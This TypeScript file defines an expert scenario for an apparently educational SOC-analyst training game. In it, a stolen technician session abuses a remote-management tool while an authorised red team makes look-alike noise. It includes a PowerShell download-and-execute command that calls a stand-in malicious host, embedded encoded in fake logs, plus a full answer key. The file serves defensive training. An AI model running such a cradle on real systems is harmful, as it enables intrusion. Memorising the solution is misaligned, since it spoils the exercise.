// Shift 10 (Expert): Corvid Managed Services, a fictional IT provider that
// runs 200+ endpoints for small-business clients through a remote-management
// tool (RMM). A technician's browser session is stolen and used to push a
// payload to client machines. At the same time an authorised red-team exercise
// is generating attack-shaped alerts from a known IP. The ticket is the key to
// telling them apart, and one "red-team" alert is not the red team at all.
import { acted, anyActed, b64utf16, defaultNoteTail, did, eachDay, hm, m, makeScenario, memo, mkUsers } from '../common'
import type { Alert, Containment, GameView, ShiftDef, TimelineRow, Wrong } from '../types'

const ATT = '198.51.100.230'
const ATT2 = '198.51.100.231'
const RT = '198.51.100.210'
const OFFICE = '203.0.113.110'
const DROP = 'cdn-image-host.net'
const RTDOM = 'corvid-benefits.example'
const SCRIPT = "iex (New-Object Net.WebClient).DownloadString('https://cdn-image-host.net/s.ps1'); Start-Process $env:TEMP\\ad.exe --install --silent"
const ENC = b64utf16(SCRIPT)

const FIELDS: Record<string, string> = {
  entra: 'user ip geo app dev result mfa ua',
  edr: 'host user proc parent cmd action sig',
  rmm: 'actor op target count detail',
  proxy: 'user host src method domain url bytes_out cat age action',
  vault: 'actor op items detail',
}
const SRCDESC: Record<string, string> = { entra: 'Entra ID sign-in logs', edr: 'Endpoint detection (process events)', rmm: 'Remote-management tool audit log (scripts, packages, API tokens)', proxy: 'Web proxy', vault: 'Client credential vault audit' }

const USERS = mkUsers([
  ['t.hargreave', 'TECH-LAP-07', 'Technician', 'r01'], ['p.okeke', 'TECH-LAP-02', 'RMM Lead', 'r02'], ['s.vance', 'SEC-LAP-01', 'Security', 'r03'], ['ben.c', 'MKT-WS-04', 'Marketing', 'r04'],
  ['kim.r', 'MKT-WS-01', 'Marketing', 'r05'], ['dave.u', 'MKT-WS-02', 'Marketing', 'r06'], ['lou.m', 'MKT-WS-03', 'Marketing', 'r07'], ['fi.n', 'FIN-WS-09', 'Finance', 'r08'],
  ['gus.h', 'TECH-LAP-03', 'Technician', 'r09'], ['rmm-scheduler', 'RMM-SRV01', 'Service', 'r10'],
], 10, 120)
const U = Object.fromEntries(USERS.map((u) => [u.n, u]))
const MKT = ['ben.c', 'kim.r', 'dave.u', 'lou.m']

const build = memo(() => makeScenario(20261009, (G) => {
  const { pick, ri, ev } = G
  eachDay(USERS.filter((u) => u.dept !== 'Service'), hm(12, 0), (u, base, end, d) => {
    if (!(d === 0 && u.n === 't.hargreave')) for (let i = 0; i < ri(1, 3); i++) ev('entra', base + ri(hm(7, 30), end), { user: u.n, ip: OFFICE, geo: 'Sheffield,GB', app: pick(['Office365 Web', 'Outlook Desktop', 'RMM Console']), dev: u.dev, result: 'success', mfa: 'push approved', ua: 'Mozilla/5.0 (Windows)' })
    for (let i = 0; i < ri(16, 26); i++) { const s = pick(['www.office.com', 'rmm.corvid.example', 'www.bbc.co.uk', 'www.google.com', 'portal.vendorhub.example', 'docs.corvid.example']); ev('proxy', base + ri(hm(7, 30), end), { user: u.n, host: u.host, src: u.ip, method: 'GET', domain: s, url: '/', bytes_out: ri(180, 900), cat: 'business', age: 6000, action: 'allowed' }) }
    for (let i = 0; i < ri(3, 5); i++) ev('edr', base + ri(hm(7, 30), end), { host: u.host, user: u.n, proc: pick(['outlook.exe', 'chrome.exe', 'teams.exe', 'putty.exe']), parent: 'explorer.exe', cmd: 'normal launch', action: 'allowed', sig: 'signed' })
    if (u.dept === 'Technician' || u.dept === 'RMM Lead') for (let i = 0; i < ri(2, 4); i++) ev('rmm', base + ri(hm(8, 0), end), { actor: u.n, op: pick(['run-script', 'remote-session', 'view-device']), target: `${ri(1, 3)} endpoints (${pick(['Parkview Dental', 'Hale & Co', 'Brook Vets'])})`, count: ri(1, 3), detail: 'routine support task' })
  })
  for (const base of [-86400, 0]) {
    const t = base + hm(10, 0)
    ev('rmm', t, { actor: 'rmm-scheduler', op: 'run-script', target: '180 endpoints (all clients)', count: 180, detail: base < 0 ? 'Weekly cleanup script (signed job)' : 'Patch Tuesday cumulative update script (signed job, chg-patch-9)' }, base === 0 ? { key: 'e_patchjob', tag: 'j7raw' } : {})
  }

  // Infostealer on the technician's laptop
  ev('edr', hm(8, 5, 12), { host: 'TECH-LAP-07', user: 't.hargreave', proc: 'AdobeUpdate_Crack.exe', parent: 'explorer.exe', cmd: 'C:\\Users\\t.hargreave\\Downloads\\AdobeUpdate_Crack.exe', action: 'allowed', sig: 'unsigned' }, { key: 'e_stealer', tag: 'j2raw' })
  ev('edr', hm(8, 5, 40), { host: 'TECH-LAP-07', user: 't.hargreave', proc: 'AdobeUpdate_Crack.exe', parent: 'AdobeUpdate_Crack.exe', cmd: 'read Chrome\\User Data\\Default\\Network\\Cookies and Login Data', action: 'allowed', sig: 'unsigned' }, { tag: 'j2raw' })
  ev('proxy', hm(8, 7, 3), { user: 't.hargreave', host: 'TECH-LAP-07', src: U['t.hargreave'].ip, method: 'POST', domain: DROP, url: '/up', bytes_out: 2100000, cat: 'uncategorized', age: 9, action: 'allowed' }, { key: 'e_drop', tag: 'j2raw' })
  // Replay of the stolen session, then the RMM abuse
  ev('entra', hm(9, 41, 22), { user: 't.hargreave', ip: ATT, geo: 'Bucharest,RO', app: 'RMM Console', dev: 'none', result: 'success', mfa: 'satisfied (token claim) · no prompt', ua: 'python-httpx/0.27' }, { key: 'e_replay', tag: 'j1raw' })
  ev('rmm', hm(9, 58, 7), { actor: 't.hargreave', op: 'create-api-token', target: 'rmm-tok-4471', count: 1, detail: 'long-lived token, scope: run-script, deploy-package, vault-read' }, { key: 'e_token', tag: 'j3raw' })
  ev('rmm', hm(10, 12, 30), { actor: 't.hargreave', op: 'run-script', target: '14 endpoints (Parkview Dental, Hale & Co, Brook Vets)', count: 14, detail: `powershell -NoP -W Hidden -enc ${ENC}` }, { key: 'e_rmm_script', tag: 'j3raw' })
  for (let i = 0; i < 14; i++) ev('edr', hm(10, 12, 50) + i * 2, { host: `CLIENT-PC-${100 + i}`, user: 'SYSTEM', proc: 'powershell.exe', parent: 'rmmagent.exe', cmd: `powershell -NoP -W Hidden -enc ${ENC.slice(0, 40)}...`, action: 'allowed', sig: 'signed' })
  ev('edr', hm(10, 38, 15), { host: 'FIN-WS-09', user: 'SYSTEM', proc: 'svchost.exe', parent: 'rmmagent.exe', cmd: `C:\\Users\\Public\\svchost.exe beacon -> ${ATT2}:443`, action: 'allowed', sig: 'unsigned' }, { key: 'e_fin_beacon', tag: 'j6raw' })
  ev('proxy', hm(10, 38, 40), { user: 'fi.n', host: 'FIN-WS-09', src: U['fi.n'].ip, method: 'POST', domain: ATT2, url: '/b', bytes_out: 300, cat: 'uncategorized', age: 0, action: 'allowed' }, { tag: 'j6raw' })
  ev('rmm', hm(11, 1, 5), { actor: 't.hargreave', op: 'deploy-package', target: '212 endpoints (all clients)', count: 212, detail: 'update_pack.msi (unsigned) · runs encryptor on first boot' }, { cond: 'deploy', key: 'e_deploy', tag: 'j9raw' })
  for (let i = 0; i < 6; i++) ev('edr', hm(11, 2) + i * 15, { host: `CLIENT-PC-${200 + i}`, user: 'SYSTEM', proc: 'msiexec.exe', parent: 'rmmagent.exe', cmd: 'msiexec /i update_pack.msi /qn', action: 'allowed', sig: 'unsigned' }, { cond: 'deploy', tag: i < 2 ? 'j9raw' : undefined })
  ev('vault', hm(11, 21, 10), { actor: 't.hargreave', op: 'export', items: '412 client credentials', detail: 'export via api token rmm-tok-4471' }, { cond: 'vault', key: 'e_vault', tag: 'j8raw' })

  // The authorised red team (RT-2026-09)
  for (const n of MKT) ev('proxy', hm(9, 5) + ri(0, 600), { user: n, host: U[n].host, src: U[n].ip, method: 'GET', domain: RTDOM, url: '/benefits/login', bytes_out: 320, cat: 'uncategorized', age: 3, action: 'allowed' }, n === 'ben.c' ? { key: 'e_rt_phish', tag: 'j4raw' } : {})
  for (const n of ['ben.c', 'kim.r']) ev('proxy', hm(9, 12) + ri(0, 200), { user: n, host: U[n].host, src: U[n].ip, method: 'POST', domain: RTDOM, url: '/benefits/login', bytes_out: 540, cat: 'uncategorized', age: 3, action: 'allowed' }, { tag: 'j4raw' })
  ev('edr', hm(9, 52, 30), { host: 'MKT-WS-04', user: 'ben.c', proc: 'svchost.exe', parent: 'winword.exe', cmd: `C:\\Users\\Public\\svchost.exe beacon -> ${RT}:443`, action: 'allowed', sig: 'unsigned' }, { key: 'e_rt_beacon', tag: 'j5raw' })
  ev('proxy', hm(9, 52, 50), { user: 'ben.c', host: 'MKT-WS-04', src: U['ben.c'].ip, method: 'POST', domain: RT, url: '/b', bytes_out: 300, cat: 'uncategorized', age: 0, action: 'allowed' }, { tag: 'j5raw' })
}))

const ALERTS: Alert[] = [
  { id: 'J1', title: 'Entra ID: technician sign-in from Romania with no MFA prompt', sev: 'med', src: 'Entra ID', ent: 't.hargreave', at: hm(9, 30), sla: m(30), raw: 'j1raw',
    rule: 'A sign-in from a new country with a satisfied-by-token MFA claim.',
    kv: [['User', 't.hargreave (technician)'], ['Source', `${ATT} (RO)`], ['App', 'RMM Console'], ['MFA', 'token claim, no prompt'], ['Device', 'none']],
    best: 'incident', alt: {}, req: ['e_replay', 'e_drop'],
    why: 'No MFA prompt and no device ID means the attacker replayed a stolen session cookie. It came out of the infostealer that ran on his laptop at 08:05. This account can run scripts on every client.',
    hints: ['A satisfied MFA claim with no prompt and no device. Where did the session come from?', 'What happened on his laptop this morning?'] },
  { id: 'J2', title: 'EDR: unsigned "AdobeUpdate_Crack.exe" reading browser cookies', sev: 'low', src: 'EDR', ent: 'TECH-LAP-07', at: hm(9, 35), sla: m(60), raw: 'j2raw',
    rule: 'An unsigned program accessed the browser cookie database.',
    kv: [['Host', 'TECH-LAP-07 (t.hargreave)'], ['File', 'Downloads\\AdobeUpdate_Crack.exe'], ['Signature', 'unsigned'], ['Time', '08:05']],
    best: 'incident', alt: {}, req: ['e_stealer', 'e_drop'],
    why: 'A cracked-software download that was an infostealer (T1555.003, T1539). It read the cookie database and posted 2.1 MB to cdn-image-host.net two minutes later. The root cause of the day.',
    hints: ['After it read the cookies, did the laptop send anything out?'] },
  { id: 'J3', title: 'RMM: script run on 14 client endpoints by t.hargreave', sev: 'high', src: 'RMM audit', ent: 't.hargreave', at: hm(10, 20), sla: m(30), raw: 'j3raw',
    rule: 'A script run on more than 10 endpoints, or a new long-lived API token.',
    kv: [['Actor', 't.hargreave'], ['Targets', '14 endpoints across 3 clients'], ['Command', 'powershell -enc ...'], ['New token', 'rmm-tok-4471 (09:58)']],
    best: 'incident', alt: {}, req: ['e_rmm_script', 'e_token', 'c_decode'],
    why: 'The attacker, as t.hargreave, created a long-lived API token (so cutting the user alone is not enough) and ran an encoded PowerShell that downloads a script and installs a remote-access tool on client machines.',
    hints: ['Decode the command. What does it install?', 'What else did that account create at 09:58?'] },
  { id: 'J4', title: 'Proxy: 6 users visited a new "benefits" login; 2 submitted', sev: 'med', src: 'Web proxy', ent: RTDOM, at: hm(9, 20), sla: m(60), raw: 'j4raw',
    rule: 'Several users visited a newly registered domain and POSTed to a login page.',
    kv: [['Domain', RTDOM], ['Visitors', '4 marketing users'], ['Submissions', '2'], ['Domain age', '3 days']],
    best: 'benign', alt: { fp: 60, it: 50 }, req: ['e_rt_phish', 'c_rt'],
    why: 'This is the phishing phase of the authorised red-team exercise RT-2026-09: domain, window and targets are all in the ticket. Log it, tell the red-team lead the detection worked, and do not treat it as an incident.',
    hints: ['Is there a ticket that names this domain? Try ticket rt-2026-09.'] },
  { id: 'J5', title: 'EDR: unsigned svchost.exe in C:\\Users\\Public calling out from MKT-WS-04', sev: 'high', src: 'EDR', ent: 'MKT-WS-04', at: hm(10, 0), sla: m(30), raw: 'j5raw',
    rule: 'A system-process name running from a user-writable folder with an outbound beacon.',
    kv: [['Host', 'MKT-WS-04 (ben.c)'], ['Parent', 'winword.exe'], ['Beacon', `${RT}:443`]],
    best: 'benign', alt: { fp: 50 }, req: ['e_rt_beacon', 'c_rt'],
    why: 'Looks exactly like a real implant, because it is a red-team implant. RT-2026-09 lists MKT-WS-04 as in scope and 198.51.100.210 as the red-team server. Isolating it would end the exercise early and blind the team to the next detections.',
    hints: ['Compare the destination IP and host with the red-team ticket.'] },
  { id: 'J6', title: 'EDR: unsigned svchost.exe in C:\\Users\\Public calling out from FIN-WS-09', sev: 'high', src: 'EDR', ent: 'FIN-WS-09', at: hm(10, 45), sla: m(30), raw: 'j6raw',
    rule: 'A system-process name running from a user-writable folder with an outbound beacon.',
    kv: [['Host', 'FIN-WS-09 (fi.n, Finance)'], ['Parent', 'rmmagent.exe'], ['Beacon', `${ATT2}:443`]],
    best: 'incident', alt: {}, req: ['e_fin_beacon', 'c_rt'],
    why: 'It looks like J5, but nothing matches the red-team ticket: Finance is explicitly excluded, the destination is 198.51.100.231 (not .210), and the parent is the RMM agent, which is how the real attacker is delivering payloads. A look-alike is not the same thing.',
    hints: ['Check host, destination IP and parent process against RT-2026-09 exactly.'] },
  { id: 'J7', title: 'RMM: script run on 180 endpoints by rmm-scheduler', sev: 'high', src: 'RMM audit', ent: 'rmm-scheduler', at: hm(10, 25), sla: m(60), raw: 'j7raw',
    rule: 'A script run on more than 100 endpoints.',
    kv: [['Actor', 'rmm-scheduler (service)'], ['Targets', '180 endpoints'], ['Job', 'Patch Tuesday (signed, chg-patch-9)'], ['Time', '10:00']],
    best: 'benign', alt: { fp: 60 }, req: ['e_patchjob', 'c_patch'],
    why: 'The monthly patch job, run at 10:00 as a signed scheduled job. It is bigger than J3 but it is the scheduler and matches yesterday\'s pattern. Disabling rmm-scheduler would have stopped patching for every client.',
    hints: ['Who ran it, and is it the same time as yesterday? Check the ticket.'] },
  { id: 'J8', title: 'Vault: export of all 412 client credentials via API token', sev: 'high', src: 'Vault', ent: 't.hargreave', at: hm(11, 25), sla: m(15), raw: 'j8raw', late: 'vault',
    rule: 'Bulk export of the client credential vault.',
    kv: [['Actor', 't.hargreave'], ['Via', 'rmm-tok-4471'], ['Items', '412 client credentials']],
    best: 'incident', alt: {}, req: ['e_vault', 'e_token'],
    why: 'The attacker used the long-lived token to export every client\'s admin credentials. Cutting the token and user by 11:20, or locking the vault, would have prevented it. Every exported credential now needs rotating at every client.',
    hints: ['The token created at 09:58 is the way in.'] },
  { id: 'J9', title: 'RMM: unsigned update_pack.msi deployed to 212 endpoints', sev: 'high', src: 'RMM audit', ent: 't.hargreave', at: hm(11, 5), sla: m(15), raw: 'j9raw', late: 'deploy',
    rule: 'An unsigned package deployed to more than 100 endpoints.',
    kv: [['Actor', 't.hargreave'], ['Package', 'update_pack.msi (unsigned)'], ['Targets', '212 endpoints, all clients']],
    best: 'incident', alt: {}, req: ['e_deploy', 'e_token'],
    why: 'At 11:01 the attacker pushed an encryptor to every client endpoint through the RMM. Cutting both the account and the API token before 11:00 (or locking the console) would have stopped it. This is a supply-chain ransomware event at 200+ clients.',
    hints: ['This is the abuse J3 was warning about.'] },
]
const EVD: Record<string, string> = {
  e_replay: 'Replayed session from Romania, no MFA prompt, no device',
  e_stealer: 'AdobeUpdate_Crack.exe reading browser cookies at 08:05',
  e_drop: '2.1 MB POST to cdn-image-host.net',
  e_token: 'Long-lived API token rmm-tok-4471 created 09:58',
  e_rmm_script: 'Encoded PowerShell run on 14 client endpoints',
  e_fin_beacon: 'svchost.exe beacon from FIN-WS-09 to .231 via rmmagent',
  e_deploy: 'Unsigned update_pack.msi pushed to 212 endpoints',
  e_vault: 'Export of 412 client credentials',
  e_rt_phish: 'The corvid-benefits.example phishing page (red team)',
  e_rt_beacon: 'MKT-WS-04 beacon to the red-team server',
  e_patchjob: 'The signed monthly patch job',
  c_decode: 'Decoded the encoded PowerShell command',
  c_rt: 'Checked the red-team ticket RT-2026-09',
  c_patch: 'Checked the patch-job ticket or yesterday\'s run',
}
const TI: Record<string, string> = {
  [ATT]: 'AS64507 NorthLink Hosting · hosting range · seen replaying stolen browser sessions against management consoles\nReputation: MALICIOUS',
  [ATT2]: 'AS64507 NorthLink Hosting · same range as .230 · command-and-control\nReputation: MALICIOUS',
  [RT]: 'Corvid-contracted red-team infrastructure (RT-2026-09). Authorised for the test window.',
  [DROP]: 'Reputation: MALICIOUS · registered 9 days ago · infostealer log drop and payload host',
  [RTDOM]: 'Corvid-contracted red-team phishing domain (RT-2026-09). Authorised.',
  [OFFICE]: 'Corvid Managed Services office egress (internal address)',
}
const WHOIS: Record<string, string> = {
  [DROP]: `Domain:      ${DROP}\nCreated:     9 days ago\nRegistrar:   privacy-protected`,
  [RTDOM]: `Domain:      ${RTDOM}\nCreated:     3 days ago\nRegistrant:  Slate Security Ltd (the contracted red team)`,
}
const PHONE: Record<string, string> = {
  't.hargreave': 'Voicemail: "Hi, this is Tom. I am off sick today, back tomorrow." (HR says he booked the day off sick this morning at 07:30.)',
  'p.okeke': 'Pete O. (RMM lead):\n"t.hargreave is off sick today, he should not be touching the console. We do not create long-lived API tokens by policy. The patch job runs every Tuesday at 10:00 as rmm-scheduler."',
  's.vance': 'Sam V. (Security, red-team contact):\n"RT-2026-09 is marketing only: MKT-WS-01 to 06, domain corvid-benefits.example, server 198.51.100.210, until 12:00. Finance and the RMM are explicitly out of scope."',
  'ben.c': 'Ben C.:\n"I did click the benefits email and put my details in. I thought it was HR. Should I not have?"',
}
const HR: Record<string, string> = {
  't.hargreave': 'Technician · SICK LEAVE today (booked 07:30) · should not be working.',
  'fi.n': 'Finance Officer · FIN-WS-09.',
}
const TICKET: Record<string, string> = {
  'rt-2026-09': 'RT-2026-09 · Approved · Red-team exercise by Slate Security Ltd · contact s.vance\nWindow: 09:00 - 12:00 today\nPhishing domain: corvid-benefits.example\nRed-team server: 198.51.100.210\nIn scope: MKT-WS-01 to MKT-WS-06\nExcluded: Finance, RMM, client endpoints, production',
  'chg-patch-9': 'CHG-PATCH-9 · Approved · requester p.okeke\nMonthly cumulative update on all managed endpoints · run by rmm-scheduler · Tuesdays 10:00 · signed job.',
}
function askIT(q: string): string {
  if (/red.?team|rt-2026|slate|pentest|pen test/i.test(q)) return 'Security: RT-2026-09 runs this morning, see the ticket for the exact scope. Finance and the RMM are excluded.'
  if (/patch|scheduler|rmm-scheduler/i.test(q)) return 'RMM: the monthly patch job runs on Tuesdays at 10:00 as rmm-scheduler, see CHG-PATCH-9.'
  if (/token|api/i.test(q)) return 'RMM: we do not issue long-lived API tokens to people. Anything with a token needs an exception.'
  return 'IT: not sure, can you raise a ticket?'
}
const CUT = (g: { actions: Set<string> }): boolean =>
  acted(g, 'lock rmm-console') || (acted(g, 'disable-key rmm-tok-4471') && anyActed(g, 'disable-user t.hargreave', 'revoke-sessions t.hargreave'))
const CONTAIN: Containment[] = [
  { label: 'Cut the attacker out: disable t.hargreave and revoke sessions', pts: 40, t: (g) => acted(g, 'disable-user t.hargreave') && acted(g, 'revoke-sessions t.hargreave') },
  { label: 'Deactivate the long-lived API token rmm-tok-4471', pts: 50, t: (g) => acted(g, 'disable-key rmm-tok-4471') },
  { label: "Isolate Tom's laptop TECH-LAP-07 (infostealer)", pts: 35, t: (g) => acted(g, 'isolate tech-lap-07') },
  { label: 'Isolate FIN-WS-09 (attacker beacon)', pts: 35, t: (g) => acted(g, 'isolate fin-ws-09') },
  { label: "Reset Tom's password", pts: 20, t: (g) => acted(g, 'reset-password t.hargreave') },
  { label: `Block ${DROP}`, pts: 20, t: (g) => acted(g, `block-domain ${DROP}`) },
  { label: `Block ${ATT} and ${ATT2}`, pts: 20, t: (g) => acted(g, `block-ip ${ATT}`) && acted(g, `block-ip ${ATT2}`) },
  { label: 'Tell the incident-response lead', pts: 15, t: (g) => acted(g, 'notify ir-lead') },
  { label: 'Tell the affected clients (vendor/customer notification)', pts: 25, t: (g) => acted(g, 'notify vendor') },
  { label: 'Lock or rotate the client vault', pts: 25, t: (g) => anyActed(g, 'lock client-vault', 'rotate-secret client-vault'), when: (g) => !!g.flags.deploy || !!g.flags.vault },
  { label: 'Tell management and legal (200+ client endpoints affected)', pts: 30, t: (g) => acted(g, 'notify management') && acted(g, 'notify legal'), when: (g) => !!g.flags.deploy },
]
const WRONG: Wrong[] = [
  { label: 'Isolated MKT-WS-04 (authorised red-team implant)', pts: -50, t: (g) => acted(g, 'isolate mkt-ws-04') },
  { label: 'Blocked the red-team server (ends the authorised exercise)', pts: -40, t: (g) => acted(g, `block-ip ${RT}`) },
  { label: 'Disabled rmm-scheduler (patching stops for every client)', pts: -60, t: (g) => acted(g, 'disable-user rmm-scheduler') },
  { label: 'Disabled ben.c (red-team phishing target)', pts: -30, t: (g) => acted(g, 'disable-user ben.c') },
  { label: 'Blocked the corporate egress IP (outage)', pts: -80, t: (g) => acted(g, `block-ip ${OFFICE}`) },
]
const CHECKS: Record<string, (g: GameView) => boolean> = {
  c_decode: (g) => did(g, /^b64\s+/i),
  c_rt: (g) => did(g, /^ticket\s+rt-2026-09/i) || did(g, /^(ask-it\s.*(red.?team|rt-2026|slate|pentest)|phone\s+s\.vance)/i),
  c_patch: (g) => did(g, /^ticket\s+chg-patch-9/i) || did(g, /^ask-it\s.*(patch|scheduler)/i) || (did(g, /source=rmm.*rmm-scheduler/i) && did(g, /(stats|top|dedup|sort)/i)),
}
function timeline(k: Set<string>, g: GameView): TimelineRow[] {
  const rows: TimelineRow[] = [
    { at: hm(8, 5), text: 'Tom runs a cracked installer that is really an infostealer; it takes his browser session', ttp: 'T1555.003 / T1539 Steal web session cookie', found: k.has('e_stealer') },
    { at: hm(8, 7), text: 'The stolen cookies are posted to cdn-image-host.net', ttp: 'T1041 Exfiltration over C2 channel', found: k.has('e_drop') },
    { at: hm(9, 41), text: 'The attacker replays the session in the RMM console from Romania', ttp: 'T1550.004 Web session cookie', found: k.has('e_replay') },
    { at: hm(9, 58), text: 'He creates a long-lived API token, rmm-tok-4471', ttp: 'T1098 Account manipulation', found: k.has('e_token') },
    { at: hm(10, 12), text: 'An encoded PowerShell runs on 14 client endpoints and installs remote access', ttp: 'T1072 Software deployment tools', found: k.has('e_rmm_script') },
    { at: hm(10, 38), text: 'A beacon appears on FIN-WS-09, delivered by the RMM agent', ttp: 'T1105 Ingress tool transfer', found: k.has('e_fin_beacon') },
  ]
  if (g.flags.deploy) rows.push({ at: hm(11, 1), text: 'update_pack.msi (ransomware) is pushed to 212 client endpoints', ttp: 'T1486 Data encrypted for impact / T1072', found: k.has('e_deploy') })
  if (g.flags.vault) rows.push({ at: hm(11, 21), text: 'All 412 client credentials are exported from the vault', ttp: 'T1555 Credentials from password stores', found: k.has('e_vault') })
  return rows
}
export const shift10: ShiftDef = {
  id: 'soc-10',
  title: 'Corvid Managed Services: two attacks, one of them paid for',
  company: 'Corvid Managed Services',
  level: 'Expert',
  blurb: 'A stolen technician session abuses the RMM on 200+ client endpoints while an authorised red team makes identical noise. The ticket tells them apart, and one look-alike is real.',
  intro: 'You are the senior analyst at Corvid Managed Services, a fictional IT provider, from 09:30 to 12:00. A red-team exercise is under way, and so is a real attack. Both use the same tricks. Read scope, destination and parent process carefully. If the RMM is abused, every client is exposed.',
  start: hm(9, 30), end: hm(12, 0), dates: ['10-08', '10-09'],
  fields: FIELDS, srcdesc: SRCDESC, users: USERS, build, alerts: ALERTS, evd: EVD,
  intel: { ti: TI, whois: WHOIS, phone: PHONE, badge: {}, hr: HR, tickets: TICKET, askIt: askIT, protectedIps: { [OFFICE]: 'this is the office egress address. Technicians lose remote access to every client.', [RT]: 'this is the authorised red-team server. The exercise is cut short.' } },
  callable: ['p.okeke', 's.vance', 'ben.c'],
  triggers: [
    {
      flag: 'deploy', at: hm(11, 0),
      contained: CUT,
      penalty: 200, penaltyLabel: 'Ransomware pushed to every client', okLog: 'RMM access cut before 11:00',
      note: (done, happened) => (!done ? 'The shift ended before 11:00.' : happened ? 'At 11:01 the attacker pushed an unsigned encryptor to 212 client endpoints. You needed to cut both the account and the API token (or lock the console).' : 'You cut the attacker out of the RMM before the payload deployed.'),
    },
    {
      flag: 'vault', at: hm(11, 20),
      contained: (g) => CUT(g) || anyActed(g, 'lock client-vault', 'rotate-secret client-vault'),
      penalty: 120, penaltyLabel: 'Client credential vault exported', okLog: 'Vault protected before 11:20',
      note: (done, happened) => (!done ? 'The shift ended before 11:20.' : happened ? 'At 11:21 the attacker used the API token to export the credentials of every client.' : 'The vault was protected before the export.'),
    },
  ],
  contain: CONTAIN, wrong: WRONG, checks: CHECKS, timeline,
  gaps: ['A technician could run scripts on every client with a single stolen browser session.', 'Session cookies were not bound to the device and MFA was not required again for sensitive actions.', 'The RMM allowed users to create long-lived API tokens.', 'Cracked software could be run on a privileged technician laptop.', 'Production deploys to client endpoints did not need a second approver or signed packages.', 'Red-team scope was not shared with SOC in a machine-readable list.', 'The client credential vault was reachable with the RMM token.'],
  noteTail: defaultNoteTail,
  chips: ['help', 'ticket rt-2026-09', 'source=rmm | sort -time | head 10', 'source=entra user=t.hargreave | table time,ip,geo,mfa,dev', `ti ${ATT}`],
  cheat: `ticket rt-2026-09
source=rmm actor=t.hargreave | table time,op,target,detail
source=edr proc=svchost.exe | table time,host,parent,cmd
source=proxy domain=cdn-image-host.net
b64 <encoded command>     hr t.hargreave
disable-user t.hargreave     disable-key rmm-tok-4471     lock client-vault     help`,
  solution: {
    cmds: ['disable-user t.hargreave', 'revoke-sessions t.hargreave', 'disable-key rmm-tok-4471', 'isolate tech-lap-07', 'isolate fin-ws-09', 'reset-password t.hargreave', `block-domain ${DROP}`, `block-ip ${ATT}`, `block-ip ${ATT2}`, 'notify ir-lead', 'notify vendor', 'ticket rt-2026-09', 'ticket chg-patch-9', `b64 ${ENC}`],
    verdicts: [['J1', 'incident'], ['J2', 'incident'], ['J3', 'incident'], ['J4', 'benign'], ['J5', 'benign'], ['J6', 'incident'], ['J7', 'benign']],
    pins: { J1: ['e_replay', 'e_drop'], J2: ['e_stealer', 'e_drop'], J3: ['e_rmm_script', 'e_token'], J4: ['e_rt_phish'], J5: ['e_rt_beacon'], J6: ['e_fin_beacon'], J7: ['e_patchjob'] },
  },
}
